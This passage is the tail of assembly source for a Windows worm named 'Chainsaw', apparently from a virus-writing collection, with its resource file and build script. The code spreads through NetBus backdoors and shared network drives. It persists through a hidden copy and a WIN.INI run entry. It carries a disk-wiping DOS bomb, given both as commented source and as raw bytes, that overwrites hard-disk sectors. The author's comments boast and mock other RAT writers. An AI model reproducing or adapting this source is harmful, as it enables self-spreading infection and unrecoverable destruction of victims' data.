                INC     EAX
                JZ      Try_NetBios

                CMP     [EDI+4], 'eRda'         ; 'UploadReady' ?
                JNE     Try_NetBios

                ; Now connect to port number <NetBus_Port+1>,
                ; which will handle the upload file content.

                PUSH    0                       ; Create a socket for the
                PUSH    SOCK_STREAM             ; upload connection.
                PUSH    AF_INET
                CALL    socket

                MOV     NetBus_Socket_2, EAX

                INC     EAX
                JZ      Try_NetBios

                MOV     EBX, NetBus_Socket_2
                CALL    Set_Time_Outs

                PUSH    16                      ; Connect the upload socket.
                PUSH    OFFSET NetBus_Conn_2
                PUSH    NetBus_Socket_2
                CALL    connect

                XCHG    EBX, EAX

                OR      EBX, EBX
                JNZ     Close_NetBus_2

                PUSH    0                       ; Send through the upload
                PUSH    Worm_Size               ; file contents.
                PUSH    OFFSET Worm_Code
                PUSH    NetBus_Socket_2
                CALL    send

                XCHG    EBX, EAX

Close_NetBus_2: PUSH    NetBus_Socket_2
                CALL    closesocket

                INC     EBX
                JZ      Close_NetBios

                ; Now remotely execute the worm on the target's
                ; system by sending 'StartApp;' + path to program:
                ; 'StartApp;\Chainsaw.exe'.

                PUSH    0
                PUSH    (End_NB_Exec_File-NB_Exec_File)
                PUSH    OFFSET NB_Exec_File
                PUSH    NetBus_Socket                
                CALL    send

Try_NetBios:    MOV     ESI, OFFSET Net_Resource_Struc
                MOV     EDI, OFFSET Net_Resource

                MOV     ECX, 8
                REP     MOVSD

                CALL    Locate_Shares           ; Infect all shared drives.

Close_NetBios:  PUSH    NetBios_Socket
                CALL    closesocket

Close_NetBus:   PUSH    NetBus_Socket
                CALL    closesocket

Close_Sub7:     PUSH    Sub7_Socket
                CALL    closesocket

                JMP     Chk_Inet_State


; Set the recv/send timeout to 5 seconds to prevent endless blocking.
Set_Time_Outs:
                PUSH    4
                PUSH    OFFSET IO_Time_Out
                PUSH    SO_RCVTIMEO
                PUSH    SOL_SOCKET
                PUSH    EBX
                CALL    setsockopt

                PUSH    4
                PUSH    OFFSET IO_Time_Out
                PUSH    SO_SNDTIMEO
                PUSH    SOL_SOCKET
                PUSH    EBX
                CALL    setsockopt

                RETN


Random_AL_254:
                MOV     AL, 254

Random_AL:      MOVZX   EAX, AL

Random_EAX:     PUSH    EAX

                CALL    GetTickCount

                ADD     EAX, Random_Init
                JNP     Xor_In_Init

                RCL     EAX, 2
                XCHG    AL, AH
                ADD     AL, 66h

Xor_In_Init:    NOT     EAX

                PUSH    32
                POP     ECX

CRC_Bit:        SHR     EAX, 1
                JNC     Loop_CRC_Bit

                XOR     EAX, 0EDB88320h

Loop_CRC_Bit:   LOOP    CRC_Bit

                POP     ECX

                XOR     EDX, EDX
                DIV     ECX

                XCHG    EDX, EAX
                INC     EAX                     ; Can't be zero.

                ROL     Random_Init, 1          ; Adjust random seed.

                RETN


; And I thought NetBus was a lame buggy piece of shit, nothing beats
; SubSeven, even though it's the one of the most advanched RAT's
; available these days, it is programmed pretty badly, the author
; clearly has no understanding of TCP/IP whatsoever, he doesn't
; even terminate his TCP commands with a terminator for example,
; which will lead to fragmented packets fucking up. Also, when you
; supply wrong commands to the server, it will downright hang itself.
; And as a bonus, SubSeven infected systems become slooow, not sure
; exactly why.. I'd say, leave writing RAT's to people who know
; their stuff, like the authors of Back Orifice 2000.


; Recursively scans the host's resources for shared drives.
Locate_Shares:
                PUSHAD

                PUSH    OFFSET Enum_Handle      ; Start enumerating all
                PUSH    OFFSET Net_Resource     ; shared drives.
                PUSH    0
                PUSH    RESOURCETYPE_DISK
                PUSH    RESOURCE_GLOBALNET
                CALL    WNetOpenEnumA

                OR      EAX, EAX
                JNZ     Exit_Loc_Share

                MOV     EBX, Enum_Handle

Enum_Resource:  MOV     Net_Struc_Count, 1

                PUSH    OFFSET Enum_Buf_Size    ; Find shared drive.
                PUSH    OFFSET Net_Resource
                PUSH    OFFSET Net_Struc_Count
                PUSH    EBX
                CALL    WNetEnumResourceA

                OR      EAX, EAX
                JNZ     Close_Enum

                CMP     Net_Usage, RESOURCEUSAGE_CONTAINER
                JNE     Infect_Share

                CALL    Locate_Shares

                JMP     Enum_Resource

Infect_Share:   MOV     Net_Local_Name, OFFSET Remote_Drive

                PUSH    0                       ; Map the shared drive to
                PUSH    0                       ; 'T:'.
                PUSH    0
                PUSH    OFFSET Net_Resource
                CALL    WNetAddConnection2A

                OR      EAX, EAX
                JNZ     Enum_Resource

                PUSH    1                       ; Copy Chainsaw.exe to the
                PUSH    OFFSET Remote_Trojan    ; root of this shared drive.
                PUSH    OFFSET Own_Path
                CALL    CopyFileA

                XCHG    ECX, EAX
                JECXZ   Un_Map_Share

                PUSH    OFFSET MsDos_Sys        ; Attempt to get the Win9x
                PUSH    260                     ; directory.
                PUSH    OFFSET Win_Dir
                PUSH    OFFSET Default_String
                PUSH    OFFSET Win_Dir_Key
                PUSH    OFFSET Paths_Section
                CALL    GetPrivateProfileStringA

                XCHG    ECX, EAX
                JECXZ   Un_Map_Share

                LEA     EDI, [Win_Dir+ECX]      ; Append '\WIN.INI' to it.
                MOV     ESI, OFFSET Slash_Win_Ini
                MOV     ECX, 9
                REP     MOVSB

                PUSH    OFFSET Win_Dir          ; Add 'run=\Chainsaw.exe' to
                PUSH    OFFSET Root_Dropper     ; Win9x's WIN.INI.
                PUSH    OFFSET Win_Ini_Run_Key
                PUSH    OFFSET Windows_Section
                CALL    WritePrivateProfileStringA

                XCHG    ECX, EAX
                JECXZ   Un_Map_Share

                PUSH    FILE_ATTRIBUTE_HIDDEN   ; Hide the drop file.
                PUSH    OFFSET Remote_Trojan
                CALL    SetFileAttributesA

Un_Map_Share:   PUSH    0                       ; Unmap shared drive.
                PUSH    0
                PUSH    OFFSET Remote_Drive
                CALL    WNetCancelConnection2A

                JMP     Enum_Resource

Close_Enum:     PUSH    EBX
                CALL    WNetCloseEnum

Exit_Loc_Share: POPAD

                RETN


; Ima go woop yo ass boy!
Payload:
                PUSH    0
                PUSH    0
                PUSH    CREATE_ALWAYS
                PUSH    0
                PUSH    0
                PUSH    GENERIC_WRITE
                PUSH    OFFSET Nuke_File
                CALL    CreateFileA

                XCHG    EBX, EAX

                PUSH    0                       ; Write bomb.
                PUSH    OFFSET Temp
                PUSH    666
                PUSH    OFFSET DOS_Bomb
                PUSH    EBX
                CALL    WriteFile

                PUSH    EBX
                CALL    CloseHandle

                PUSH    0                       ; Run the bomb (only WinExec
                PUSH    OFFSET Nuke_File        ; is capable of running DOS
                CALL    WinExec                 ; files too).

                JMP     $                       ; Heart stops..


        ; Bomb in DOS COM-format, this way it works both on 95/98 and NT/2K.
        ; Smashes disk structures of 1st 2 fixed disks, should be fast and
        ; unrecoverable.

;               .MODEL  TINY
;               .CODE
;
;               ORG     100h
;START:
;               MOV     AX, 3513h               ; Grab INT 13h's address.
;               INT     21h
;
;               MOV     Int13h, BX              ; Store it for later.
;               MOV     Int13h+2, ES
;
;               PUSH    CS
;               POP     ES
;
;               XOR     SI, SI
;
;               MOV     BX, OFFSET Trash_Text
;               MOV     CX, (End_Trash_Text-Trash_Text)
;
;               ; Decrypt trash text.
;
;Decrypt_Text:  XOR     BYTE PTR [BX+SI], 66h
;
;               INC     SI
;
;               LOOP    Decrypt_Text
;
;               INC     CX                      ; CX = 0001h.
;
;               MOV     DX, 80h+1               ; Start trashing backwards
;                                               ; from 2nd HDD.
;
;Kill_Head:     MOV     AX, 0302h               ; Smash 2 sectors of track
;               PUSHF                           ; 0 with our text.
;               DB      9Ah
;Int13h         DW      0, 0
;
;               INC     DH                      ; Smashed all heads?
;               JNZ     Kill_Head
;
;               DEC     DL                      ; Smashed all HDD's ?
;               JS      Kill_Head
;
;Exit:          RETN                            ; Back to Windoze..
;
;               DB      'T2'                    ; To pad this file to 666.
;
;               ; XOR 66h encrypted:
;
;               ; "THE FILM WHICH YOU ARE ABOUT TO SEE IS AN ACCOUNT OF THE
;               ; TRAGEDY WHICH BEFELL A GROUP OF FIVE YOUTHS. IN PARTICULAR
;               ; SALLY HARDESTY AND HER INVALID BROTHER FRANKLIN. IT IS ALL
;               ; THE MORE TRAGIC IN THAT THEY WERE YOUNG. BUT, HAD THEY
;               ; LIVED VERY, VERY LONG LIVES, THEY COULD NOT HAVE EXPECTED
;               ; NOR WOULD THEY HAVE WISHED TO SEE AS MUCH OF THE MAD AND
;               ; MACABRE AS THEY WERE TO SEE THAT DAY. FOR THEM AN IDYLLIC
;               ; SUMMER AFTERNOON DRIVE BECAME A NIGHTMARE. THE EVENTS OF
;               ; THAT DAY WERE TO LEAD TO THE DISCOVERY OF ONE OF THE MOST
;               ; BIZARRE CRIMES IN THE ANNALS OF AMERICAN HISTORY,
;               ; THE TEXAS CHAIN SAW MASSACRE..."
;
;               ; (I adore this movie :)
;
;Trash_Text:    DB      44h, 32h, 2Eh, 23h, 46h, 20h, 2Fh, 2Ah, 2Bh, 46h
;               DB      31h, 2Eh, 2Fh, 25h, 2Eh, 46h, 3Fh, 29h, 33h, 46h
;               DB      27h, 34h, 23h, 46h, 27h, 24h, 29h, 33h, 32h, 46h
;               DB      32h, 29h, 46h, 35h, 23h, 23h, 46h, 2Fh, 35h, 46h
;               DB      27h, 28h, 46h, 27h, 25h, 25h, 29h, 33h, 28h, 32h
;               DB      46h, 29h, 20h, 46h, 32h, 2Eh, 23h, 6Bh, 6Ch, 32h
;               DB      34h, 27h, 21h, 23h, 22h, 3Fh, 46h, 31h, 2Eh, 2Fh
;               DB      25h, 2Eh, 46h, 24h, 23h, 20h, 23h, 2Ah, 2Ah, 46h
;               DB      27h, 46h, 21h, 34h, 29h, 33h, 36h, 46h, 29h, 20h
;               DB      46h, 20h, 2Fh, 30h, 23h, 46h, 3Fh, 29h, 33h, 32h
;               DB      2Eh, 35h, 48h, 46h, 2Fh, 28h, 46h, 36h, 27h, 34h
;               DB      32h, 2Fh, 25h, 33h, 2Ah, 27h, 34h, 6Bh, 6Ch, 35h
;               DB      27h, 2Ah, 2Ah, 3Fh, 46h, 2Eh, 27h, 34h, 22h, 23h
;               DB      35h, 32h, 3Fh, 46h, 27h, 28h, 22h, 46h, 2Eh, 23h
;               DB      34h, 46h, 2Fh, 28h, 30h, 27h, 2Ah, 2Fh, 22h, 46h
;               DB      24h, 34h, 29h, 32h, 2Eh, 23h, 34h, 46h, 20h, 34h
;               DB      27h, 28h, 2Dh, 2Ah, 2Fh, 28h, 48h, 46h, 2Fh, 32h
;               DB      46h, 2Fh, 35h, 46h, 27h, 2Ah, 2Ah, 6Bh, 6Ch, 32h
;               DB      2Eh, 23h, 46h, 2Bh, 29h, 34h, 23h, 46h, 32h, 34h
;               DB      27h, 21h, 2Fh, 25h, 46h, 2Fh, 28h, 46h, 32h, 2Eh
;               DB      27h, 32h, 46h, 32h, 2Eh, 23h, 3Fh, 46h, 31h, 23h
;               DB      34h, 23h, 46h, 3Fh, 29h, 33h, 28h, 21h, 48h, 46h
;               DB      24h, 33h, 32h, 4Ah, 46h, 2Eh, 27h, 22h, 46h, 32h
;               DB      2Eh, 23h, 3Fh, 6Bh, 6Ch, 2Ah, 2Fh, 30h, 23h, 22h
;               DB      46h, 30h, 23h, 34h, 3Fh, 4Ah, 46h, 30h, 23h, 34h
;               DB      3Fh, 46h, 2Ah, 29h, 28h, 21h, 46h, 2Ah, 2Fh, 30h
;               DB      23h, 35h, 4Ah, 46h, 32h, 2Eh, 23h, 3Fh, 46h, 25h
;               DB      29h, 33h, 2Ah, 22h, 46h, 28h, 29h, 32h, 46h, 2Eh
;               DB      27h, 30h, 23h, 46h, 23h, 3Eh, 36h, 23h, 25h, 32h
;               DB      23h, 22h, 6Bh, 6Ch, 28h, 29h, 34h, 46h, 31h, 29h
;               DB      33h, 2Ah, 22h, 46h, 32h, 2Eh, 23h, 3Fh, 46h, 2Eh
;               DB      27h, 30h, 23h, 46h, 31h, 2Fh, 35h, 2Eh, 23h, 22h
;               DB      46h, 32h, 29h, 46h, 35h, 23h, 23h, 46h, 27h, 35h
;               DB      46h, 2Bh, 33h, 25h, 2Eh, 46h, 29h, 20h, 46h, 32h
;               DB      2Eh, 23h, 46h, 2Bh, 27h, 22h, 46h, 27h, 28h, 22h
;               DB      6Bh, 6Ch, 2Bh, 27h, 25h, 27h, 24h, 34h, 23h, 46h
;               DB      27h, 35h, 46h, 32h, 2Eh, 23h, 3Fh, 46h, 31h, 23h
;               DB      34h, 23h, 46h, 32h, 29h, 46h, 35h, 23h, 23h, 46h
;               DB      32h, 2Eh, 27h, 32h, 46h, 22h, 27h, 3Fh, 48h, 46h
;               DB      20h, 29h, 34h, 46h, 32h, 2Eh, 23h, 2Bh, 46h, 27h
;               DB      28h, 46h, 2Fh, 22h, 3Fh, 2Ah, 2Ah, 2Fh, 25h, 6Bh
;               DB      6Ch, 35h, 33h, 2Bh, 2Bh, 23h, 34h, 46h, 27h, 20h
;               DB      32h, 23h, 34h, 28h, 29h, 29h, 28h, 46h, 22h, 34h
;               DB      2Fh, 30h, 23h, 46h, 24h, 23h, 25h, 27h, 2Bh, 23h
;               DB      46h, 27h, 46h, 28h, 2Fh, 21h, 2Eh, 32h, 2Bh, 27h
;               DB      34h, 23h, 48h, 46h, 32h, 2Eh, 23h, 46h, 23h, 30h
;               DB      23h, 28h, 32h, 35h, 46h, 29h, 20h, 6Bh, 6Ch, 32h
;               DB      2Eh, 27h, 32h, 46h, 22h, 27h, 3Fh, 46h, 31h, 23h
;               DB      34h, 23h, 46h, 32h, 29h, 46h, 2Ah, 23h, 27h, 22h
;               DB      46h, 32h, 29h, 46h, 32h, 2Eh, 23h, 46h, 22h, 2Fh
;               DB      35h, 25h, 29h, 30h, 23h, 34h, 3Fh, 46h, 29h, 20h
;               DB      46h, 29h, 28h, 23h, 46h, 29h, 20h, 46h, 32h, 2Eh
;               DB      23h, 46h, 2Bh, 29h, 35h, 32h, 6Bh, 6Ch, 24h, 2Fh
;               DB      3Ch, 27h, 34h, 34h, 23h, 46h, 25h, 34h, 2Fh, 2Bh
;               DB      23h, 35h, 46h, 2Fh, 28h, 46h, 32h, 2Eh, 23h, 46h
;               DB      27h, 28h, 28h, 27h, 2Ah, 35h, 46h, 29h, 20h, 46h
;               DB      27h, 2Bh, 23h, 34h, 2Fh, 25h, 27h, 28h, 46h, 2Eh
;               DB      2Fh, 35h, 32h, 29h, 34h, 3Fh, 4Ah, 6Bh, 6Ch, 32h
;               DB      2Eh, 23h, 46h, 32h, 23h, 3Eh, 27h, 35h, 46h, 25h
;               DB      2Eh, 27h, 2Fh, 28h, 46h, 35h, 27h, 31h, 46h, 2Bh
;               DB      27h, 35h, 35h, 27h, 25h, 34h, 23h, 48h, 48h, 48h
;               DB      44h, 6Bh, 6Ch
;End_Trash_Text:
;               END     START

DOS_Bomb:       DB      0B8h, 013h, 035h, 0CDh, 021h, 089h, 01Eh, 026h, 001h
                DB      08Ch, 006h, 028h, 001h, 00Eh, 007h, 033h, 0F6h, 0BBh
                DB      035h, 001h, 0B9h, 065h, 002h, 080h, 030h, 066h, 046h
                DB      0E2h, 0FAh, 041h, 0BAh, 081h, 000h, 0B8h, 002h, 003h
                DB      09Ch, 09Ah, 000h, 000h, 000h, 000h, 0FEh, 0C6h, 075h
                DB      0F3h, 0FEh, 0CAh, 078h, 0EFh, 0C3h, 054h, 032h, 044h
                DB      032h, 02Eh, 023h, 046h, 020h, 02Fh, 02Ah, 02Bh, 046h
                DB      031h, 02Eh, 02Fh, 025h, 02Eh, 046h, 03Fh, 029h, 033h
                DB      046h, 027h, 034h, 023h, 046h, 027h, 024h, 029h, 033h
                DB      032h, 046h, 032h, 029h, 046h, 035h, 023h, 023h, 046h
                DB      02Fh, 035h, 046h, 027h, 028h, 046h, 027h, 025h, 025h
                DB      029h, 033h, 028h, 032h, 046h, 029h, 020h, 046h, 032h
                DB      02Eh, 023h, 06Bh, 06Ch, 032h, 034h, 027h, 021h, 023h
                DB      022h, 03Fh, 046h, 031h, 02Eh, 02Fh, 025h, 02Eh, 046h
                DB      024h, 023h, 020h, 023h, 02Ah, 02Ah, 046h, 027h, 046h
                DB      021h, 034h, 029h, 033h, 036h, 046h, 029h, 020h, 046h
                DB      020h, 02Fh, 030h, 023h, 046h, 03Fh, 029h, 033h, 032h
                DB      02Eh, 035h, 048h, 046h, 02Fh, 028h, 046h, 036h, 027h
                DB      034h, 032h, 02Fh, 025h, 033h, 02Ah, 027h, 034h, 06Bh
                DB      06Ch, 035h, 027h, 02Ah, 02Ah, 03Fh, 046h, 02Eh, 027h
                DB      034h, 022h, 023h, 035h, 032h, 03Fh, 046h, 027h, 028h
                DB      022h, 046h, 02Eh, 023h, 034h, 046h, 02Fh, 028h, 030h
                DB      027h, 02Ah, 02Fh, 022h, 046h, 024h, 034h, 029h, 032h
                DB      02Eh, 023h, 034h, 046h, 020h, 034h, 027h, 028h, 02Dh
                DB      02Ah, 02Fh, 028h, 048h, 046h, 02Fh, 032h, 046h, 02Fh
                DB      035h, 046h, 027h, 02Ah, 02Ah, 06Bh, 06Ch, 032h, 02Eh
                DB      023h, 046h, 02Bh, 029h, 034h, 023h, 046h, 032h, 034h
                DB      027h, 021h, 02Fh, 025h, 046h, 02Fh, 028h, 046h, 032h
                DB      02Eh, 027h, 032h, 046h, 032h, 02Eh, 023h, 03Fh, 046h
                DB      031h, 023h, 034h, 023h, 046h, 03Fh, 029h, 033h, 028h
                DB      021h, 048h, 046h, 024h, 033h, 032h, 04Ah, 046h, 02Eh
                DB      027h, 022h, 046h, 032h, 02Eh, 023h, 03Fh, 06Bh, 06Ch
                DB      02Ah, 02Fh, 030h, 023h, 022h, 046h, 030h, 023h, 034h
                DB      03Fh, 04Ah, 046h, 030h, 023h, 034h, 03Fh, 046h, 02Ah
                DB      029h, 028h, 021h, 046h, 02Ah, 02Fh, 030h, 023h, 035h
                DB      04Ah, 046h, 032h, 02Eh, 023h, 03Fh, 046h, 025h, 029h
                DB      033h, 02Ah, 022h, 046h, 028h, 029h, 032h, 046h, 02Eh
                DB      027h, 030h, 023h, 046h, 023h, 03Eh, 036h, 023h, 025h
                DB      032h, 023h, 022h, 06Bh, 06Ch, 028h, 029h, 034h, 046h
                DB      031h, 029h, 033h, 02Ah, 022h, 046h, 032h, 02Eh, 023h
                DB      03Fh, 046h, 02Eh, 027h, 030h, 023h, 046h, 031h, 02Fh
                DB      035h, 02Eh, 023h, 022h, 046h, 032h, 029h, 046h, 035h
                DB      023h, 023h, 046h, 027h, 035h, 046h, 02Bh, 033h, 025h
                DB      02Eh, 046h, 029h, 020h, 046h, 032h, 02Eh, 023h, 046h
                DB      02Bh, 027h, 022h, 046h, 027h, 028h, 022h, 06Bh, 06Ch
                DB      02Bh, 027h, 025h, 027h, 024h, 034h, 023h, 046h, 027h
                DB      035h, 046h, 032h, 02Eh, 023h, 03Fh, 046h, 031h, 023h
                DB      034h, 023h, 046h, 032h, 029h, 046h, 035h, 023h, 023h
                DB      046h, 032h, 02Eh, 027h, 032h, 046h, 022h, 027h, 03Fh
                DB      048h, 046h, 020h, 029h, 034h, 046h, 032h, 02Eh, 023h
                DB      02Bh, 046h, 027h, 028h, 046h, 02Fh, 022h, 03Fh, 02Ah
                DB      02Ah, 02Fh, 025h, 06Bh, 06Ch, 035h, 033h, 02Bh, 02Bh
                DB      023h, 034h, 046h, 027h, 020h, 032h, 023h, 034h, 028h
                DB      029h, 029h, 028h, 046h, 022h, 034h, 02Fh, 030h, 023h
                DB      046h, 024h, 023h, 025h, 027h, 02Bh, 023h, 046h, 027h
                DB      046h, 028h, 02Fh, 021h, 02Eh, 032h, 02Bh, 027h, 034h
                DB      023h, 048h, 046h, 032h, 02Eh, 023h, 046h, 023h, 030h
                DB      023h, 028h, 032h, 035h, 046h, 029h, 020h, 06Bh, 06Ch
                DB      032h, 02Eh, 027h, 032h, 046h, 022h, 027h, 03Fh, 046h
                DB      031h, 023h, 034h, 023h, 046h, 032h, 029h, 046h, 02Ah
                DB      023h, 027h, 022h, 046h, 032h, 029h, 046h, 032h, 02Eh
                DB      023h, 046h, 022h, 02Fh, 035h, 025h, 029h, 030h, 023h
                DB      034h, 03Fh, 046h, 029h, 020h, 046h, 029h, 028h, 023h
                DB      046h, 029h, 020h, 046h, 032h, 02Eh, 023h, 046h, 02Bh
                DB      029h, 035h, 032h, 06Bh, 06Ch, 024h, 02Fh, 03Ch, 027h
                DB      034h, 034h, 023h, 046h, 025h, 034h, 02Fh, 02Bh, 023h
                DB      035h, 046h, 02Fh, 028h, 046h, 032h, 02Eh, 023h, 046h
                DB      027h, 028h, 028h, 027h, 02Ah, 035h, 046h, 029h, 020h
                DB      046h, 027h, 02Bh, 023h, 034h, 02Fh, 025h, 027h, 028h
                DB      046h, 02Eh, 02Fh, 035h, 032h, 029h, 034h, 03Fh, 04Ah
                DB      06Bh, 06Ch, 032h, 02Eh, 023h, 046h, 032h, 023h, 03Eh
                DB      027h, 035h, 046h, 025h, 02Eh, 027h, 02Fh, 028h, 046h
                DB      035h, 027h, 031h, 046h, 02Bh, 027h, 035h, 035h, 027h
                DB      025h, 034h, 023h, 048h, 048h, 048h, 044h, 06Bh, 06Ch

                END     START

                ; *shrug*, haven't really finished this piece-o-crap,
                ; mainly because I got fed up with all them bugs in
                ; the server programs.. also not sure if the NetBios
                ; shit works on remotes.. oh fuck it :|
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[CHAINSAW.ASM]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[CHAINSAW.RC]컴�
I ICON DISCARDABLE "BLACK.ICO"
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[CHAINSAW.RC]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[Q.BAT]컴�
TASM32 CHAINSAW.ASM /ml /m
TLINK32 CHAINSAW.OBJ  C:\TASM\LIB\IMPORT32.LIB WININET.LIB -aa
BRC32 CHAINSAW.RC
UPX\UPX CHAINSAW.EXE --force
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[Q.BAT]컴�
